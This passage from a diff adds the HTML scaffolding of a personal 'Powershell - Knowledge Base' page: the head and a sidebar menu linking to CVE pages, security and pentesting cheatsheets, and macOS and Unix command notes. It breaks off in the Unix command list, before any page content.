@@ -1,0 +1,1798 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+        <title>Powershell - Knowledge Base</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        
+        
+        
+
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="../../assets/css/darcula-highlight.min.css">
+
+        <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../../assets/css/dracula-ui.min.css">
+        <link rel="stylesheet" href="../../assets/css/mkdocs.min.css">
+
+        
+            <link  rel="icon" type="image/x-icon" href="../../assets/img/favicon.ico">
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+                <script>hljs.initHighlightingOnLoad();</script>
+
+ <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
+
+<body class="drac-bg-black-secondary drac-text-grey-ternary drac-text drac-scrollbar-purple">
+
+    <main class="d-flex">
+
+        <!-- block sidebar -->
+            <nav id="sidebar" class="sidebar drac-bg-black">
+    <div class="custom-menu">
+        <button type="button" id="sidebarCollapse" class="btn btn-primary">
+            <i class="fa fa-bars"></i>
+            <span class="sr-only">Menu</span>
+        </button>
+    </div>
+
+    <div class="p-4">
+        
+            <img class="logo" src="../../assets/images/kb.png" height="150px">
+        
+
+        <div class="drac-text-center">
+            
+                <span class="drac-text drac-line-height drac-text-white">Knowledge Base</span>
+            
+        </div>
+
+        <div class="drac-box flex-column">
+            <ul class="dot-ul">
+                <li><div class="dot-li drac-bg-cyan"></div></li>
+                <li><div class="dot-li drac-bg-green"></div></li>
+                <li><div class="dot-li drac-bg-orange"></div></li>
+                <li><div class="dot-li drac-bg-pink"></div></li>
+                <li><div class="dot-li drac-bg-purple"></div></li>
+                <li><div class="dot-li drac-bg-red"></div></li>
+                <li><div class="dot-li drac-bg-yellow"></div></li>
+            </ul>
+        </div>
+
+        <hr class="drac-divider" />
+
+        <!-- block menu -->
+        <ul class="mb-5 drac-list drac-list-none">
+            
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Homepage
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../../page2/"
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Page 2
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#cves-collapse" aria-expanded="false">
+                    CVEs
+                </a>
+                <div class="collapse" id="cves-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2007-1036/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2007-1036
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2012-0002/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2012-0002
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2012-1675/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2012-1675
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2013-4786/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2013-4786
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-0224/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-0224
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-6321/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-6321
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2014-8272/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2014-8272
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2016-1287/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2016-1287
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2016-2107/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2016-2107
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-0143/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-0143
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-12542/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-12542
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2017-8917/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2017-8917
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2018-10993/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2018-10993
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-0686/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-0686
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-0708/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-0708
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-18935/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-18935
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-19781/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-19781
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-2725/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-2725
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2019-5392/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2019-5392
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-0609/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-0609
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-0796/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-0796
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-10487/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-10487
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-1350/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-1350
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-1472/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-1472
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-14882/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-14882
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2020-5902/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2020-5902
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-26855/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-26855
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-27850/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-27850
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-34473/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-34473
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-34527/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-34527
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-4034/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-4034
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-40449/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-40449
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2021-44228/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2021-44228
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-0847/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-0847
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-21882/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-21882
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../CVEs/CVE-2022-30190/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CVE-2022-30190
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#cheatsheets-collapse" aria-expanded="false">
+                    Cheatsheets
+                </a>
+                <div class="collapse" id="cheatsheets-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Active%20Directory%20Pentesting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Active Directory Pentesting Cheatsheet
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Bash%20Scripting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Bash Scripting
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Chrome%20URLs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chrome URLs/Flags
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Default%20Credentials%20Cheat%20Sheet/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Default Credentials Cheat Sheet
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Exchange%20Versions/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Exchange Versions
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/GitHub%20Dorks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            GitHub Dorks
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Google%20Dorks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Google Dorks
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Headers%20%26%20Files/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Headers & Files
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/List%20of%20TLDs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            List of TLDs
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Miscellaneous/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Miscellaneous
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Netmasks%20%26%20Subnetting/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netmasks & Subnetting
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/PrivEsc%20Mindmap/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            PrivEsc Mindmap
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Regex/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Regex
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/Windows%20Security%20Log%20References/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Windows Security Log References
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/XSS/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            XSS
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Cheatsheets/XXE%20Injection/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            XML External Entity (XXE) Injection
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#macos-commands-collapse" aria-expanded="false">
+                    MacOS Commands
+                </a>
+                <div class="collapse" id="macos-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/caffeinate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Caffeinate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/ditto/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ditto
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/firmwarepasswd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Firmwarepasswd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/ipconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ipconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/networkquality/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Networkquality
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/powermetrics/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Powermetrics
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/scutil/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Scutil
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/security/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Security
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/sha2/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha2
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/softwareupdate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Softwareupdate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/spctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Spctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/system_profiler/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            System_profiler
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../MacOS%20Commands/tweaks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tweaks
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#unix-commands-collapse" aria-expanded="false">
+                    Unix Commands
+                </a>
+                <div class="collapse" id="unix-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/apropos/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Apropos
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/apt/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Apt
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/awk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Awk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/base64/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Base64
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/biosdecode/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Biosdecode
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/blkid/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Blkid
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cal/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cal
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chage/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chage
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chmod/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chmod
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/chsh/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Chsh
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/comm/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Comm
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/crontab/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Crontab
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/cut/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cut
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/date/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Date
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/delv/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Delv
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/df/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Df
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/diff/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Diff
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/dmesg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dmesg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/faketime/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Faketime
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/fdisk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Fdisk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/file/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            File
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/find/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Find
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/fls/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Fls
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/free/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Free
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ftp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ftp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ghostscript/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ghostscript
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/gpg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Gpg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/grep/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Grep
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/groupadd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Groupadd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/groupdel/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Groupdel
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/hdparm/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Hdparm
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/head/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Head
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/history/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            History
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/host/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Host
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ifconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ifconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/iotop/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Iotop
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ip/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ip
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/iwconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Iwconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/journalctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Journalctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/kill/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Kill
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ln/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ln
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/locate/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Locate
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ls/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ls
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsb_release/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsb_release
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsblk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsblk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lshw/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lshw
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsmod/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsmod
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lspci/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lspci
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lsusb/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lsusb
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/lvextend/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Lvextend
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/md5sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Md5sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mkdir/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mkdir
+        </a>
+    </li>
+                            
